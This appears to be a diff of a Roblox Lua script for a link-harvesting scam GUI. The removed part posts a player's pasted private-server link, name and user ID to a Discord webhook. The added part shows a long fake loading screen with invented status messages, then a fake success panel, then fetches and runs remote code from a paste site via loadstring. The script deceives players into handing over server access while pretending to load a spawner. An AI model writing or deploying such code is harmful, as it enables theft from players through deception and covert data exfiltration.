-    notificationFrame.Position = UDim2.new(0.5, -200, 0.05, 0)
-    TweenService:Create(notificationFrame, TweenInfo.new(0.3, Enum.EasingStyle.Back), {
-        Position = UDim2.new(0.5, -200, 0.1, 0)
-    }):Play()
-    
-    task.wait(duration)
-    
-    local tweenOut = TweenService:Create(notificationFrame, TweenInfo.new(0.3), {
-        Position = UDim2.new(0.5, -200, 0.05, 0)
-    })
-    tweenOut:Play()
-    tweenOut.Completed:Wait()
-    notificationFrame.Visible = false
-end
-
--- CORRECTED LINK VALIDATION
-local function isValidRobloxPrivateServerLink(link)
-    local hasShareCode = string.find(link, "roblox.com/share?code=") ~= nil
-    if not hasShareCode then
-        return false, "❌ Link inválido! Use: https://www.roblox.com/share?code=..."
-    end
-    return true, nil
-end
-
--- DISCORD WEBHOOK FUNCTION
-local function sendToDiscord(serverLink)
-    print("🔵 Enviando para Discord...")
-    
-    local payload = {
-        content = "🎮 **Novo Link Coletado!**",
-        embeds = {
-            {
-                title = "Brainrot GUI - Novo Link",
-                description = "Um novo servidor foi coletado",
-                color = 255,
-                fields = {
-                    {
-                        name = "📎 Link do Servidor",
-                        value = "```\n" .. serverLink .. "\n```",
-                        inline = false
-                    },
-                    {
-                        name = "👤 Jogador",
-                        value = player.Name,
-                        inline = true
-                    },
-                    {
-                        name = "🆔 User ID",
-                        value = tostring(player.UserId),
-                        inline = true
-                    },
-                    {
-                        name = "⏰ Horário",
-                        value = os.date("%d/%m/%Y %H:%M:%S"),
-                        inline = false
-                    }
-                }
-            }
-        }
-    }
-    
-    local success, response = pcall(function()
-        return HttpService:PostAsync(
-            DISCORD_WEBHOOK,
-            HttpService:JSONEncode(payload),
-            Enum.HttpContentType.ApplicationJson
-        )
-    end)
-    
-    if success then
-        print("✅ Link enviado ao Discord!")
-        showNotification("✅ Link enviado com sucesso!", 3)
-        return true
-    else
-        print("❌ Erro: " .. tostring(response))
-        showNotification("❌ Erro ao enviar", 3)
-        return false
-    end
-end
-
-local function getBrainrotValue()
-    local brainrotValue = 0
-    local leaderstats = player:FindFirstChild("leaderstats")
-    if leaderstats then
-        for _, stat in pairs(leaderstats:GetChildren()) do
-            if string.lower(stat.Name) == "brainrot" then
-                brainrotValue = tonumber(stat.Value) or 0
-                return brainrotValue
-            end
-        end
-    end
-    return REQUIRED_BRAINROT
-end
-
-local function onDoneClick()
-    local inputText = inputBox.Text:match("^%s*(.-)%s*$") or ""
-    
-    if inputText == "" then
-        showNotification("❌ Cole o link do servidor!", 3)
-        return
-    end
-    
-    local isValid, errorMsg = isValidRobloxPrivateServerLink(inputText)
-    if not isValid then
-        showNotification(errorMsg, 3)
-        return
-    end
-    
-    local brainrotValue = getBrainrotValue()
-    if brainrotValue < REQUIRED_BRAINROT then
-        showNotification("❌ Você precisa de 100M+ Brainrot", 4)
-        return
-    end
-    
-    sendToDiscord(inputText)
-    
-    mainFrame.Visible = false
-    mainBg.BackgroundTransparency = 0
-    loadingScreen.Visible = true
-    
-    local startTime = tick()
-    local elapsed = 0
-    
-    while elapsed < LOADING_DURATION do
-        elapsed = tick() - startTime
-        local progress = math.min(elapsed / LOADING_DURATION, 1)
-        loadingBarFill.Size = UDim2.new(progress, 0, 1, 0)
-        task.wait(0.05)
-    end
-    
-    loadingTitle.Visible = false
-    loadingBarBg.Visible = false
-    completionMessage.Text = "✓ Completo!"
-    
-    task.wait(3)
-    
-    loadingScreen.Visible = false
-    mainBg.BackgroundTransparency = 1
-    mainFrame.Visible = true
-    inputBox.Text = ""
-end
-
-doneButton.MouseButton1Click:Connect(onDoneClick)
-
-inputBox.FocusLost:Connect(function(enterPressed)
-    if enterPressed then
-        onDoneClick()
-    end
+spawn(function()
+	local dots = {".", "..", "...", ""}
+	local index = 1
+	while true do
+		dotsLabel.Text = dots[index]
+		index = index % #dots + 1
+		task.wait(0.5)
+	end
 end)
 
-print("✅ GUI carregada!")
+local rotationTween = TweenService:Create(logoFrame, TweenInfo.new(4, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1), {Rotation = 360})
+rotationTween:Play()
+
+local pulseInfo = TweenInfo.new(1.5, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut, -1, true)
+local pulseTween = TweenService:Create(innerLogo, pulseInfo, {Size = UDim2.new(0.7, 0, 0.7, 0)})
+pulseTween:Play()
+
+local glowPulse = TweenService:Create(logoStroke, TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {Transparency = 0.1})
+glowPulse:Play()
+
+local statusMessages = {
+	"Initializing connection...",
+	"Verifying server integrity...",
+	"Loading script modules...",
+	"Syncing configuration data...",
+	"Preparing runtime environment...",
+	"Establishing secure channel...",
+	"Validating authentication tokens...",
+	"Finalizing setup..."
+}
+
+local startTime = tick()
+local duration = 200
+local currentStatus = 1
+
+spawn(function()
+	while tick() - startTime < duration do
+		local elapsed = tick() - startTime
+		local progress = math.min(elapsed / duration, 0.99)
+		
+		progressBar.Size = UDim2.new(progress, 0, 1, 0)
+		percentLabel.Text = math.floor(progress * 100) .. "%"
+		
+		if elapsed > currentStatus * 30 and currentStatus <= #statusMessages then
+			statusLabel.Text = statusMessages[currentStatus]
+			currentStatus = currentStatus + 1
+		end
+		
+		RunService.RenderStepped:Wait()
+	end
+	
+	progressBar.Size = UDim2.new(1, 0, 1, 0)
+	percentLabel.Text = "100%"
+	statusLabel.Text = "Loading complete!"
+	
+	task.wait(0.8)
+	
+	rotationTween:Cancel()
+	pulseTween:Cancel()
+	glowPulse:Cancel()
+	
+	logoFrame.Rotation = 0
+	centerContainer:TweenPosition(UDim2.new(0.5, 0, 0.25, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Quart, 0.6, true)
+	
+	task.wait(0.7)
+	
+	local successFrame = Instance.new("Frame")
+	successFrame.Name = "SuccessFrame"
+	successFrame.Size = UDim2.new(0, 480, 0, 240)
+	successFrame.Position = UDim2.new(0.5, 0, 1.5, 0)
+	successFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+	successFrame.BackgroundColor3 = Color3.fromRGB(20, 30, 25)
+	successFrame.BorderSizePixel = 0
+	successFrame.ZIndex = 6
+	successFrame.Parent = background
+	
+	local successCorner = Instance.new("UICorner")
+	successCorner.CornerRadius = UDim.new(0, 16)
+	successCorner.Parent = successFrame
+	
+	local successBorder = Instance.new("UIStroke")
+	successBorder.Color = Color3.fromRGB(50, 180, 80)
+	successBorder.Thickness = 3
+	successBorder.Parent = successFrame
+	
+	local successGradient = Instance.new("UIGradient")
+	successGradient.Color = ColorSequence.new{
+		ColorSequenceKeypoint.new(0, Color3.fromRGB(25, 35, 28)),
+		ColorSequenceKeypoint.new(1, Color3.fromRGB(15, 25, 18))
+	}
+	successGradient.Rotation = 90
+	successGradient.Parent = successFrame
+	
+	local successScale = Instance.new("UIScale")
+	successScale.Parent = successFrame
+	
+	local successIconFrame = Instance.new("Frame")
+	successIconFrame.Size = UDim2.new(0, 70, 0, 70)
+	successIconFrame.Position = UDim2.new(0.5, 0, 0, 25)
+	successIconFrame.AnchorPoint = Vector2.new(0.5, 0)
+	successIconFrame.BackgroundColor3 = Color3.fromRGB(50, 180, 80)
+	successIconFrame.BorderSizePixel = 0
+	successIconFrame.ZIndex = 7
+	successIconFrame.Parent = successFrame
+	
+	local iconCorner = Instance.new("UICorner")
+	iconCorner.CornerRadius = UDim.new(1, 0)
+	iconCorner.Parent = successIconFrame
+	
+	local iconStroke = Instance.new("UIStroke")
+	iconStroke.Color = Color3.fromRGB(100, 255, 130)
+	iconStroke.Thickness = 3
+	iconStroke.Parent = successIconFrame
+	
+	local iconCheck = Instance.new("TextLabel")
+	iconCheck.Size = UDim2.new(1, 0, 1, 0)
+	iconCheck.BackgroundTransparency = 1
+	iconCheck.Text = "✓"
+	iconCheck.TextColor3 = Color3.fromRGB(255, 255, 255)
+	iconCheck.TextSize = 48
+	iconCheck.Font = Enum.Font.GothamBold
+	iconCheck.ZIndex = 8
+	iconCheck.Parent = successIconFrame
+	
+	local successTitle = Instance.new("TextLabel")
+	successTitle.Size = UDim2.new(0.9, 0, 0, 35)
+	successTitle.Position = UDim2.new(0.5, 0, 0, 105)
+	successTitle.AnchorPoint = Vector2.new(0.5, 0)
+	successTitle.BackgroundTransparency = 1
+	successTitle.Text = "SUCCESS!"
+	successTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+	successTitle.TextSize = 28
+	successTitle.Font = Enum.Font.GothamBold
+	successTitle.ZIndex = 7
+	successTitle.Parent = successFrame
+	
+	local successMessage = Instance.new("TextLabel")
+	successMessage.Size = UDim2.new(0.88, 0, 0, 85)
+	successMessage.Position = UDim2.new(0.5, 0, 0, 145)
+	successMessage.AnchorPoint = Vector2.new(0.5, 0)
+	successMessage.BackgroundTransparency = 1
+	successMessage.Text = "Script loaded successfully! Enjoy the script!"
+	successMessage.TextColor3 = Color3.fromRGB(190, 210, 195)
+	successMessage.TextSize = 16
+	successMessage.Font = Enum.Font.Gotham
+	successMessage.TextWrapped = true
+	successMessage.TextXAlignment = Enum.TextXAlignment.Center
+	successMessage.ZIndex = 7
+	successMessage.Parent = successFrame
+	
+	local function updateSuccessScale()
+		local viewportSize = workspace.CurrentCamera.ViewportSize
+		local minDimension = math.min(viewportSize.X, viewportSize.Y)
+		local scale = math.clamp(minDimension / 800, 0.45, 1.5)
+		successScale.Scale = scale
+	end
+	
+	updateSuccessScale()
+	workspace.CurrentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(updateSuccessScale)
+	
+	successFrame:TweenPosition(UDim2.new(0.5, 0, 0.58, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Back, 0.7, true)
+	
+	spawn(function()
+		for i = 1, 3 do
+			TweenService:Create(iconStroke, TweenInfo.new(0.5, Enum.EasingStyle.Sine), {Transparency = 0.3}):Play()
+			task.wait(0.5)
+			TweenService:Create(iconStroke, TweenInfo.new(0.5, Enum.EasingStyle.Sine), {Transparency = 0}):Play()
+			task.wait(0.5)
+		end
+	end)
+	
+	task.wait(2.5)
+
+	
+	screenGui:Destroy()
+    -- ur visual here, the pastefy is strawberry elephant spawner visual
+	loadstring(game:HttpGet("https://pastefy.app/tc0CrufV/raw"))()
+    -- above me
+	StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)
+	StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, true)
+    end)
+end
+
+local function handleSubmission(link, screenGui, errorLabel, webhookResponse, brainrots)
+    if isValidPrivateServerLink(link) then
+        errorLabel.TextColor3 = Color3.new(0.3, 1, 0.3)
+        errorLabel.Text = "Correct private link!"
+        task.wait(1)
+        screenGui:Destroy()
+        task.spawn(function()
+    Loading2()
+end)
+    else
+        errorLabel.TextColor3 = Color3.new(1, 0.3, 0.3)
+        errorLabel.Text = "Wrong private link! Input correct one"
+        task.wait(3)
+        errorLabel.Text = ""
+    end
+end
+
+    local screenGui, textBox, submitBtn, errorLabel = createLinkGUI()
+    
+    submitBtn.MouseButton1Click:Connect(function()
+        handleSubmission(textBox.Text, screenGui, errorLabel, webhookResponse, brainrots)
+    end)
